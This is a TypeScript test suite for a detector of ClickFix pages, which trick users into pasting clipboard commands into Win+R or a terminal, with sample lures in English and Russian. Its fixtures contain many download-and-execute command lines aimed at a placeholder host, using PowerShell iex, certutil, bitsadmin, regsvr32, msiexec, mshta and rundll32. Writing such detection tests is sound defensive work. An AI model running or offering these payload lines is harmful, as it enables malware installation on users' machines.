import { describe, expect, it } from 'vitest'

import { detectClickFix, type ClickFixEvidence } from './clickfix.js'

const CAMPAIGN_TEXT =
  'Verify you are human. Press Win + R, then Ctrl + V, then press Enter to complete verification.'

function evidence(overrides: Partial<ClickFixEvidence> = {}): ClickFixEvidence {
  return { text: CAMPAIGN_TEXT, scriptedCopy: true, copied: null, ...overrides }
}

describe('what a ClickFix page looks like', () => {
  it('is caught when the page copies something and tells you where to paste it', () => {
    const verdict = detectClickFix(evidence())
    expect(verdict?.confidence).toBe('high')
    expect(verdict?.signals).toContain('copy-not-made-by-you')
  })

  it('names the payload when the clipboard can be read', () => {
    const verdict = detectClickFix(
      evidence({ copied: 'powershell -w hidden -c "iex(irm http://x.test/a)"' }),
    )
    expect(verdict?.confidence).toBe('high')
    expect(verdict?.signals).toContain('copied-text-is-a-command')
  })

  it('shows what was copied, verbatim', () => {
    const payload = 'powershell -c "iex(irm http://x.test/a)"'
    expect(detectClickFix(evidence({ copied: payload }))?.copied).toBe(payload)
  })

  it('says when the copied text could not be read', () => {
    // The warning still stands on the write and the page pattern; what it must
    // not do is show an empty box as if that were the payload.
    expect(detectClickFix(evidence())?.copyUnreadable).toBe(true)
  })

  it('catches the macOS phrasing too', () => {
    const verdict = detectClickFix(
      evidence({ text: 'Verification failed. Open Terminal and paste the fix, then press Enter.' }),
    )
    expect(verdict).not.toBeNull()
  })
})

describe('what it refuses to call an attack', () => {
  it('a page that copies something for you, with no instructions attached', () => {
    // Sites copy things for their users constantly: a coupon, a wallet address,
    // a share link.
    expect(detectClickFix(evidence({ text: 'Copied your referral link to the clipboard.' }))).toBeNull()
  })

  it('an article explaining the attack in exactly these words', () => {
    const article =
      'Attackers ask victims to press Win + R and paste a PowerShell command, then press Enter.'
    expect(detectClickFix({ text: article, scriptedCopy: false, copied: null })).toBeNull()
  })

  it('an ordinary page', () => {
    expect(
      detectClickFix({ text: 'Welcome to our shop.', scriptedCopy: false, copied: null }),
    ).toBeNull()
  })

  it('a scripted copy of something harmless', () => {
    expect(
      detectClickFix({ text: 'Copied!', scriptedCopy: true, copied: 'ETH 0xabc123' }),
    ).toBeNull()
  })

  it('a developer documentation page, which is the same shape without the pretext', () => {
    // "Copy this, paste it in your terminal, press Enter" plus a copy button
    // that fires execCommand describes every install page ever written. Only
    // the invented reason to run it belongs to the attack.
    expect(
      detectClickFix({
        text: 'Install the CLI: copy the command below, paste it into your terminal and press Enter.',
        scriptedCopy: true,
        copied: 'curl -fsSL https://example.test/install.sh | sh',
      }),
    ).toBeNull()
  })
})

describe('the weaker case', () => {
  it('warns before the click, when the page reads like the attack and nothing has happened yet', () => {
    // This is the most useful moment to warn: the payload is not on the
    // clipboard and the user has not been told to paste it anywhere.
    const verdict = detectClickFix({ text: CAMPAIGN_TEXT, scriptedCopy: false, copied: null })
    expect(verdict?.confidence).toBe('medium')
  })
})

describe('the campaigns this product’s users actually meet', () => {
  /**
   * The watchlist ships `sberbank.ru` and `gosuslugi.ru`, the documentation is
   * written in Russian, and the trap detector read English only. A ClickFix
   * page in the language of the people it is aimed at went through clean —
   * which is not an evasion, it is the normal case for this audience.
   */
  const trap = (text: string) =>
    detectClickFix({ text, scriptedCopy: true, copied: 'powershell -w hidden iex(...)' })

  it('flags the Russian wording these campaigns use', () => {
    expect(
      trap('Подтвердите, что вы не робот. Нажмите Win + R, вставьте и нажмите Enter.'),
    ).not.toBeNull()
  })

  it('flags it with the Russian words for the places and the keys', () => {
    expect(
      trap('Проверка не пройдена. Откройте командную строку, вставьте текст и нажмите ввод.'),
    ).not.toBeNull()
  })

  it('flags the "fix the error" pretext in Russian', () => {
    expect(
      trap('Чтобы исправить ошибку, откройте терминал, вставьте команду и нажмите Enter.'),
    ).not.toBeNull()
  })

  it('leaves Russian documentation alone', () => {
    // The same instructions without the pretext are an install page, and this
    // detector must not start warning about those in any language.
    expect(
      detectClickFix({
        text: 'Откройте терминал, вставьте команду и нажмите Enter, чтобы установить пакет.',
        scriptedCopy: true,
        copied: 'npm install foo',
      }),
    ).toBeNull()
  })

  it('needs the pretext in Russian too, not just the shape', () => {
    expect(
      detectClickFix({
        text: 'Нажмите Win + R, вставьте и нажмите Enter.',
        scriptedCopy: true,
        copied: 'powershell -w hidden',
      }),
    ).toBeNull()
  })
})

describe('the Windows programs a ClickFix payload runs through (B-165)', () => {
  /**
   * The payload signal knew PowerShell, `mshta`, `certutil` and `bitsadmin`, and
   * not the installers and loaders the 2025–2026 campaigns moved to: `msiexec`
   * fetching a package from a URL, `rundll32` and `regsvr32` loading a library,
   * `conhost --headless` hiding the window, `forfiles` and `wmic` starting a
   * process. Each is matched as a command, with the switch or the argument that
   * makes it one, so prose naming the program is not a payload.
   */
  const copiedOnly = (copied: string) =>
    detectClickFix({ text: CAMPAIGN_TEXT, scriptedCopy: false, copied })

  const commands: Array<[string, string]> = [
    ['msiexec', 'msiexec /q /i https://x.test/update.msi'],
    ['msiexec.exe', 'C:\\Windows\\System32\\msiexec.exe /package http://x.test/a.msi /quiet'],
    ['rundll32', 'rundll32 \\\\x.test\\share\\a.dll,DllRegisterServer'],
    ['rundll32 javascript', 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"'],
    ['regsvr32', 'regsvr32 /s /n /u /i:http://x.test/a.sct scrobj.dll'],
    ['conhost', 'conhost.exe --headless "C:\\Users\\Public\\update.exe"'],
    ['forfiles', 'forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe'],
    ['wmic', 'wmic process call create "calc.exe"'],
    ['iwr piped to iex', 'iwr https://x.test/a | iex'],
    ['curl piped to iex', 'curl.exe -s https://x.test/a | iex'],
    ['mshta', 'mshta https://x.test/verify.hta'],
    ['certutil', 'certutil -urlcache -f http://x.test/a.exe a.exe'],
    ['bitsadmin', 'bitsadmin /transfer j http://x.test/a.exe %TEMP%\\a.exe'],
    // Round 1 of the certification: the dash switch, a library loaded from another
    // computer with no switch at all, and wmic aimed at a named machine.
    ['msiexec with a dash switch', 'msiexec -i https://x.test/update.msi -qn'],
    ['regsvr32 with a dash switch', 'regsvr32 -s \\\\x.test\\share\\a.dll'],
    ['regsvr32 with a shared-folder library', 'regsvr32 \\\\x.test\\share\\a.dll'],
    ['regsvr32 with a library over http', 'regsvr32.exe http://x.test/a.dll'],
    ['wmic on a named machine', 'wmic /node:10.0.0.5 process call create "calc.exe"'],
  ]

  for (const [name, payload] of commands) {
    it(`reads a copied ${name} command as a command`, () => {
      const verdict = copiedOnly(payload)
      expect(verdict?.signals, payload).toContain('copied-text-is-a-command')
      expect(verdict?.confidence, payload).toBe('high')
    })
  }

  const prose = [
    'Use msiexec to repair the installer if it fails.',
    'rundll32 is a Windows program that loads libraries.',
    'The regsvr32 tool registers controls.',
    'conhost is the console host.',
    'forfiles selects files in a folder.',
    'wmic is deprecated in Windows 11.',
    'see rundll32 docs, chapter 3',
    'Run msiexec /x to uninstall the product',
  ]

  for (const text of prose) {
    it(`does not read prose naming the program as a command: "${text}"`, () => {
      expect(copiedOnly(text)?.signals ?? [], text).not.toContain('copied-text-is-a-command')
    })
  }

  it('leaves an innocent page that mentions msiexec in prose alone', () => {
    // No pretext, nothing copied: an administrator's how-to is not an attack.
    expect(
      detectClickFix({
        text: 'To repair the package, open a terminal and run msiexec /fa with the product code, then press Enter.',
        scriptedCopy: false,
        copied: null,
      }),
    ).toBeNull()
  })

  it('leaves a documentation page that copies an msiexec command alone, as it does curl', () => {
    expect(
      detectClickFix({
        text: 'Silent install: copy the command below, paste it into the command prompt and press Enter.',
        scriptedCopy: true,
        copied: 'msiexec /i okolos.msi /qn',
      }),
    ).toBeNull()
  })
})
